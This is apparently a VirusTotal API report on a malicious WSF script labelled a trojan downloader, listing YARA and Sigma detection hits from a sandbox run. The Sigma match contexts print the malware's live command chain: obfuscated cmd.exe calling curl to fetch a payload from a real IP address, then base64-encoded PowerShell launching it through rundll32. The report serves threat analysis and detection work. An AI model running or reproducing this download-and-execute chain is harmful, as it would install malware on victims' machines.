{
    "data":  {
                 "id":  "c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5"
                           },
                 "attributes":  {
                                    "type_description":  "Python",
                                    "crowdsourced_yara_results":  [
                                                                      {
                                                                          "ruleset_id":  "0122bae1e9",
                                                                          "rule_name":  "Base64_Encoded_URL",
                                                                          "ruleset_name":  "Base64_Encoded_URL",
                                                                          "description":  "This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.",
                                                                          "author":  "InQuest Labs",
                                                                          "match_date":  1767865823,
                                                                          "ruleset_version":  "0122bae1e9|589bbefc22847193cac455858fa15e627d671918",
                                                                          "source":  "https://github.com/InQuest/yara-rules-vt"
                                                                      }
                                                                  ],
                                    "names":  [
                                                  "c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5.bin",
                                                  "c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5.wsf",
                                                  "LIBEROd.wsf",
                                                  "EOSs.wsf"
                                              ],
                                    "unique_sources":  6,
                                    "filecondis":  {
                                                       "raw_md5":  "0b5dc9735ca5e6b463f49d124e1a03c1",
                                                       "dhash":  "dabe1e9e8e868380"
                                                   },
                                    "type_extension":  "py",
                                    "tlsh":  "T1A8A4F99AA311123F0A72D25458AF3B8DB93C5D66E310D1B8782CD4668759F8FD13B2EC",
                                    "meaningful_name":  "c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5.bin",
                                    "magika":  "TXT",
                                    "tags":  [
                                                 "detect-debug-environment",
                                                 "python",
                                                 "long-sleeps",
                                                 "macro-powershell"
                                             ],
                                    "sha256":  "c7102c6da4d36183cc79150e98dd8838aeef9f3cd255dfd8269934e5d80932d5",
                                    "threat_severity":  {
                                                            "version":  5,
                                                            "threat_severity_level":  "SEVERITY_HIGH",
                                                            "threat_severity_data":  {
                                                                                         "popular_threat_category":  "trojan",
                                                                                         "num_gav_detections":  2,
                                                                                         "belongs_to_bad_collection":  true
                                                                                     },
                                                            "last_analysis_date":  "1709645989",
                                                            "level_description":  "Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes."
                                                        },
                                    "last_submission_date":  1699862074,
                                    "times_submitted":  6,
                                    "reputation":  -2,
                                    "total_votes":  {
                                                        "harmless":  0,
                                                        "malicious":  2
                                                    },
                                    "popular_threat_classification":  {
                                                                          "suggested_threat_label":  "trojan.sagent",
                                                                          "popular_threat_category":  [
                                                                                                          {
                                                                                                              "count":  16,
                                                                                                              "value":  "trojan"
                                                                                                          },
                                                                                                          {
                                                                                                              "count":  2,
                                                                                                              "value":  "downloader"
                                                                                                          }
                                                                                                      ],
                                                                          "popular_threat_name":  [
                                                                                                      {
                                                                                                          "count":  6,
                                                                                                          "value":  "sagent"
                                                                                                      }
                                                                                                  ]
                                                                      },
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-4376-654E-5F06-000000003B00}; ProcessId=7256; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-4372-654E-5B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7092; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\rundll32.exe\" C:\\ProgramData\\palladianAugite.scr Excpt; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=pOwErsHelL  -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= ; UtcTime=1699627894; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2105a0eff0c693326dcb33bbdcfd768fd6c8825061ae9eb48d31703fabf241e5",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potentially Suspicious PowerShell Child Processes",
                                                                       "rule_description":  "Detects potentially suspicious child processes spawned by PowerShell",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Tim Shelton"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-436A-654E-5506-000000003B00}; ProcessId=7340; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-4364-654E-5206-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8100; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %%pRogramdata%%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\LIBEROd.wsf\"; UtcTime=1699627882; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "78dc71a5599dc85b3d37a6ab0f014aa5110b2ce1b2346c8f2730e0c481977781",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Curl Download And Execute Combination",
                                                                       "rule_description":  "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
                                                                       "rule_author":  "Sreeman, Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-436F-654E-5906-000000003B00}; ProcessId=3380; Product=The curl executable; Description=The curl executable; Company=curl, https://curl.haxx.se/; ParentProcessGuid={C784477D-436A-654E-5506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; OriginalFileName=curl.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=7.55.1; ParentProcessId=7340; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=CuRL  http://128.140.59.162/WaS/Lewds -o C:\\ProgramData\\palladianAugite.scr ; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\curl.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %pRogramdata%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; UtcTime=1699627887; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "d86dfee683d0e96803dc8a153d15f7208afc774045e2d885ccaec10bdcef7831",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Curl.EXE Download",
                                                                       "rule_description":  "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-4376-654E-5F06-000000003B00}; ProcessId=7256; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-4372-654E-5B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7092; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\rundll32.exe\" C:\\ProgramData\\palladianAugite.scr Excpt; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=pOwErsHelL  -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= ; UtcTime=1699627894; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Rundll32 Execution Without DLL File",
                                                                       "rule_description":  "Detects the execution of rundll32 with a command line that doesn\u0027t contain a .dll file",
                                                                       "rule_author":  "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou (fix + fp)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-4376-654E-5F06-000000003B00}; ProcessId=7256; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-4372-654E-5B06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7092; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\rundll32.exe\" C:\\ProgramData\\palladianAugite.scr Excpt; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=pOwErsHelL  -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= ; UtcTime=1699627894; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "2fd6d2b16365ba7157eee4934b406ac7d530b4ec62cc1b45c69ee4f07989f139",
                                                                       "rule_source":  "SOC Prime Threat Detection Marketplace",
                                                                       "rule_title":  "LOLBAS rundll32 without expected arguments (via cmdline)",
                                                                       "rule_description":  "Detects use of rundll32 as a LOLBAS binary where rundll32 is passed unexpected arguments such as a .iso instead of .dll (i.e. rundll32.exe test.iso, evilexport).",
                                                                       "rule_author":  "SOC Prime Team"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=3380; TargetFilename=C:\\ProgramData\\palladianAugite.scr; RuleName=-; CreationUtcTime=1699627887; UtcTime=1699627887; ProcessGuid={C784477D-436F-654E-5906-000000003B00}; Image=C:\\Windows\\system32\\curl.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "7a463b569de43655b8e8cf5b970001d720c38abf81bce54ba71ad19765b096e7",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "SCR File Write Event",
                                                                       "rule_description":  "Detects the creation of screensaver files (.scr) outside of system folders. Attackers may execute an application as an \".SCR\" file using \"rundll32.exe desk.cpl,InstallScreenSaver\" for example.",
                                                                       "rule_author":  "Christopher Peacock @securepeacock, SCYTHE @scythe_io"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-4364-654E-5206-000000003B00}; ProcessId=8100; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-DE2C-6538-6B00-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4948; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\LIBEROd.wsf\"; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1699627876; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b884f70bb47a8e06faf8f548fcfef77fe3802d22c310c4cdfa01f35cb030bac",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
                                                                       "rule_description":  "Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript",
                                                                       "rule_author":  "Michael Haag"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=3380; Image=C:\\Windows\\system32\\curl.exe; ProcessGuid={C784477D-436F-654E-5906-000000003B00}; CreationUtcTime=1699627887; UtcTime=1699627887; RuleName=-; TargetFilename=C:\\ProgramData\\palladianAugite.scr}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "ad081ff821748a3cd86b5954ef5c3d7d2a6602fe0b6e50ed47938b98bc184122",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Screensaver Binary File Creation",
                                                                       "rule_description":  "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-4372-654E-5B06-000000003B00}; ProcessId=7092; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-436A-654E-5506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7340; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=pOwErsHelL  -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= ; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %pRogramdata%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; UtcTime=1699627890; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "eb75f9de2201bfad4ef177dca85b0b8fa8e5a86ba2357af5301f72acbc5eb144",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Execution of Powershell with Base64",
                                                                       "rule_description":  "Commandline to launch powershell with a base64 payload",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-436F-654E-5906-000000003B00}; ProcessId=3380; Product=The curl executable; Description=The curl executable; Company=curl, https://curl.haxx.se/; ParentProcessGuid={C784477D-436A-654E-5506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; OriginalFileName=curl.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=7.55.1; ParentProcessId=7340; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=CuRL  http://128.140.59.162/WaS/Lewds -o C:\\ProgramData\\palladianAugite.scr ; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\curl.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %pRogramdata%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; UtcTime=1699627887; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "eb80a13f018daf47775fec9d5aaf6173f1ad3ed6a71702583f0bbb2feabc66f4",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "File Download From IP URL Via Curl.EXE",
                                                                       "rule_description":  "Detects file downloads directly from IP address URL using curl.exe",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-436A-654E-5506-000000003B00}; ProcessId=7340; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-4364-654E-5206-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8100; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %%pRogramdata%%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\LIBEROd.wsf\"; UtcTime=1699627882; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-436F-654E-5906-000000003B00}; ProcessId=3380; Product=The curl executable; Description=The curl executable; Company=curl, https://curl.haxx.se/; ParentProcessGuid={C784477D-436A-654E-5506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; OriginalFileName=curl.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=7.55.1; ParentProcessId=7340; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=CuRL  http://128.140.59.162/WaS/Lewds -o C:\\ProgramData\\palladianAugite.scr ; EventID=1; LogonGuid=C784477D-DE2B-6538-80C4-030000000000; LogonId=246912; Image=C:\\Windows\\System32\\curl.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c pZLEdQE || z05f || PinG -n 3 z1J6DM || PinG GJiu || ECHo faH617D \u0026 CuRL http://128.140.59.162/WaS/Lewds -o %pRogramdata%\\palladianAugite.scr \u0026 PinG -n 2 GJiu || ECHo palladianAugite \u0026 pOwErsHelL -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFAAUgBPAEcAUgBBAE0ARABBAFQAQQBcAHAAYQBsAGwAYQBkAGkAYQBuAEEAdQBnAGkAdABlAC4AcwBjAHIALAAgAEUAeABjAHAAdAA= \u0026 eXIt; UtcTime=1699627887; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "f92451c8957e89bb4e61e68433faeb8d7c1461c3b90d06b3403c8f3d87c728b8",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Usage Of Web Request Commands And Cmdlets",
                                                                       "rule_description":  "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine",
                                                                       "rule_author":  "James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger"
                                                                   },
